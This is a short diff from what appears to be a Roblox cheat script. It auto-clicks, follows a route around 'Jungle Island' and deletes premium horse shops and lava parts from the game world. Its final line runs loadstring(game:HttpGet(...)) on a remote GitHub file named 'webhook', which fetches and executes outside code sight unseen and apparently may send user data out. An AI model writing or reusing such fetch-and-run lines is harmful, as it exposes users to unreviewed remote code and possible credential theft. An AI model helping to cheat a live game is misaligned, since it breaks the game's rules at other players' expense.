@@ -294,9 +294,9 @@ startAutoClicker()
 followLoopFrom(workspace.Islands["Jungle Island"])
 
 -- Remove parts
+workspace.Islands["Volcano Island"]:WaitForChild("LavaParts"):Destroy()
 workspace.Islands["Jungle Island"]:WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 workspace.Islands["Lunar Islands"]:WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 workspace.Islands["Volcano Island"]:WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
-workspace.Islands["Volcano Island"]:WaitForChild("LavaParts"):Destroy()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
